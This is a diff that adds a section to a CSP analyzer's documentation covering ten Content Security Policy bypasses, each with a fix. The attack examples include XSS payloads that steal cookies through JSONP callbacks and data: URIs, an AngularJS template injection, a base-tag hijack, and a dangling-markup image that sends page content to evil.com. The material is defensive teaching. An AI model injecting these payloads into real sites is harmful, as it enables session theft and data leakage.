@@ -319,6 +319,300 @@ Content-Security-Policy: default-src 'self'; base-uri 'self'
 
 ---
 
+## Advanced: CSP Bypass Detection
+
+The analyzer detects **12 common CSP bypass patterns** that attackers exploit to circumvent Content Security Policy protections. Even a "secure-looking" CSP can be vulnerable to these bypasses.
+
+### Bypass 1: JSONP Endpoints ⚠️ HIGH RISK
+
+**What is JSONP?**
+JSONP (JSON with Padding) is a technique that allows cross-origin data retrieval. However, many popular domains expose JSONP endpoints that can execute arbitrary JavaScript.
+
+**Vulnerable Configuration:**
+```
+Content-Security-Policy: script-src 'self' https://accounts.google.com
+```
+
+**Attack Scenario:**
+An attacker can inject:
+```html
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.cookie)"></script>
+```
+
+**Result:** The `callback` parameter executes arbitrary JavaScript, bypassing CSP.
+
+**Known JSONP Bypass Domains:**
+- `accounts.google.com`, `www.google.com`, `ajax.googleapis.com`
+- `maps.googleapis.com`, `www.google-analytics.com`
+- `angularjs.org`, `*.cloudflare.com`
+- `*.amazonaws.com`, `*.s3.amazonaws.com`
+- `cdnjs.cloudflare.com`, `unpkg.com`, `code.jquery.com`
+- `maxcdn.bootstrapcdn.com`, `*.bootstrapcdn.com`
+- `ajax.aspnetcdn.com`, `*.jsdelivr.net`
+
+**Fix:**
+```
+# Remove risky CDNs or use strict-dynamic with nonces
+Content-Security-Policy: script-src 'self' 'strict-dynamic' 'nonce-RandomValue'
+```
+
+---
+
+### Bypass 2: Angular Template Injection ⚠️ HIGH RISK
+
+**Vulnerable Configuration:**
+```
+Content-Security-Policy: script-src 'self' https://ajax.googleapis.com/ajax/libs/angularjs/
+```
+
+**Attack Scenario:**
+If your application uses AngularJS and allows user-controlled content:
+```html
+{{constructor.constructor('alert(1)')()}}
+```
+
+**Result:** AngularJS template injection executes arbitrary code.
+
+**Fix:**
+- Remove AngularJS CDN from CSP if not needed
+- Use Angular (modern) instead of AngularJS
+- Sanitize user input rigorously
+- Use `'strict-dynamic'` with nonces
+
+---
+
+### Bypass 3: Data URIs in script-src ⚠️ HIGH RISK
+
+**Vulnerable Configuration:**
+```
+Content-Security-Policy: script-src 'self' data:
+```
+
+**Attack Scenario:**
+Attacker injects:
+```html
+<script src="data:text/javascript,alert(document.cookie)"></script>
+```
+
+**Result:** Data URI encodes malicious script, bypassing CSP.
+
+**Fix:**
+```
+# Never allow data: in script-src
+Content-Security-Policy: script-src 'self'
+```
+
+---
+
+### Bypass 4: AWS S3 Buckets ⚠️ HIGH RISK
+
+**Vulnerable Configuration:**
+```
+Content-Security-Policy: script-src 'self' https://mybucket.s3.amazonaws.com
+```
+
+**Attack Scenario:**
+If the S3 bucket has write permissions or misconfigured ACLs:
+- Attacker uploads malicious script to bucket
+- Script executes with CSP approval
+
+**Fix:**
+- Remove S3 domains from CSP
+- Use signed URLs with strict expiration
+- Host scripts on your own infrastructure
+
+---
+
+### Bypass 5: Missing base-uri ⚠️ MEDIUM RISK
+
+**Vulnerable Configuration:**
+```
+Content-Security-Policy: script-src 'self'
+```
+*(Note: `base-uri` is NOT specified)*
+
+**Attack Scenario:**
+Attacker injects:
+```html
+<base href="https://evil.com/">
+```
+
+Then your code loads:
+```html
+<script src="/app.js"></script>
+```
+
+**Result:** Browser loads `https://evil.com/app.js` instead of your script.
+
+**Fix:**
+```
+Content-Security-Policy: script-src 'self'; base-uri 'self'
+```
+
+---
+
+### Bypass 6: Missing object-src ⚠️ MEDIUM RISK
+
+**Vulnerable Configuration:**
+```
+Content-Security-Policy: script-src 'self'
+```
+*(Note: `object-src` defaults to `default-src`, often permissive)*
+
+**Attack Scenario:**
+Attacker injects Flash/plugin content:
+```html
+<object data="https://evil.com/exploit.swf"></object>
+```
+
+**Result:** Flash plugin executes malicious code.
+
+**Fix:**
+```
+Content-Security-Policy: script-src 'self'; object-src 'none'
+```
+
+---
+
+### Bypass 7: script-src 'self' with File Upload ⚠️ MEDIUM RISK
+
+**Vulnerable Configuration:**
+```
+Content-Security-Policy: script-src 'self'
+```
+
+**Attack Scenario:**
+If your application allows file uploads to the same origin:
+1. Attacker uploads `malicious.js` to `/uploads/malicious.js`
+2. Attacker injects: `<script src="/uploads/malicious.js"></script>`
+
+**Result:** Stored XSS via uploaded file.
+
+**Fix:**
+- Host user uploads on separate domain (`uploads.example.com`)
+- Serve uploads with `Content-Disposition: attachment`
+- Use `Content-Type: application/octet-stream` for uploads
+- Implement strict file type validation
+
+---
+
+### Bypass 8: unsafe-hashes Without Context ⚠️ LOW-MEDIUM RISK
+
+**Vulnerable Configuration:**
+```
+Content-Security-Policy: script-src 'self' 'unsafe-hashes' 'sha256-...'
+```
+
+**Attack Scenario:**
+`unsafe-hashes` allows inline event handlers like:
+```html
+<button onclick="alert(1)">Click</button>
+```
+
+If attacker can inject HTML, they can execute scripts via event handlers.
+
+**Fix:**
+- Only use `unsafe-hashes` when absolutely necessary
+- Prefer nonces for inline scripts
+- Remove inline event handlers
+
+---
+
+### Bypass 9: script-src-elem Without script-src ⚠️ LOW RISK
+
+**Vulnerable Configuration:**
+```
+Content-Security-Policy: script-src-elem 'self'
+```
+*(Note: `script-src-elem` controls `<script>` tags but NOT inline handlers)*
+
+**Attack Scenario:**
+Attacker can still use:
+```html
+<img src=x onerror="alert(1)">
+```
+
+**Result:** Inline event handler executes.
+
+**Fix:**
+```
+# Use script-src instead, it covers both
+Content-Security-Policy: script-src 'self'
+```
+
+---
+
+### Bypass 10: Dangling Markup via img-src ⚠️ LOW RISK
+
+**Vulnerable Configuration:**
+```
+Content-Security-Policy: img-src *
+```
+
+**Attack Scenario:**
+Attacker injects:
+```html
+<img src="https://evil.com/steal?data=
+```
+
+Browser fetches:
+```
+https://evil.com/steal?data=<rest-of-page-content>
+```
+
+**Result:** Leaks sensitive page data to attacker.
+
+**Fix:**
+```
+Content-Security-Policy: img-src 'self' data:
+```
+
+---
+
+### How the Analyzer Detects Bypasses
+
+The analyzer automatically checks for all these bypass patterns and categorizes them by severity:
+
+**HIGH Severity Bypasses:**
+- JSONP endpoints → Status: **BAD**
+- Angular template injection → Status: **BAD**
+- Data URIs in script-src → Status: **BAD**
+- AWS S3/user-uploaded content domains → Status: **BAD**
+
+**MEDIUM/LOW Severity Bypasses:**
+- Missing base-uri → Recommendation only
+- Missing object-src → Recommendation only
+- script-src 'self' with potential file upload → Recommendation only
+
+**Example Output:**
+```
+Status: BAD
+Severity: HIGH
+Message: CSP allows https://ajax.googleapis.com which has known JSONP endpoints that can bypass CSP
+Recommendation: Remove https://ajax.googleapis.com from script-src or use 'strict-dynamic' with nonces/hashes instead
+```
+
+---
+
+### Best Practices to Prevent Bypasses
+
+✅ **DO:**
+- Use `'strict-dynamic'` with nonces for modern browsers
+- Explicitly set `base-uri 'self'`
+- Set `object-src 'none'`
+- Host scripts on your own domain
+- Use subresource integrity (SRI) for CDN scripts
+- Regularly audit your CSP with tools like [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
+
+❌ **DON'T:**
+- Trust CDNs with JSONP endpoints (Google APIs, AngularJS, etc.)
+- Allow `data:` URIs in `script-src`
+- Use wildcard sources (`*`, `https:`, `http:`)
+- Host user uploads on the same origin as scripts
+- Leave `base-uri` or `object-src` unspecified
+
+---
+
 ## Implementation Guide
 
 ### Step 1: Start in Report-Only Mode
@@ -415,6 +709,6 @@ app.use((req, res, next) => {
 
 ---
 
-**Last Updated:** 2025-12-12
+**Last Updated:** 2026-01-01
 **Status:** Active
 **Severity:** Critical
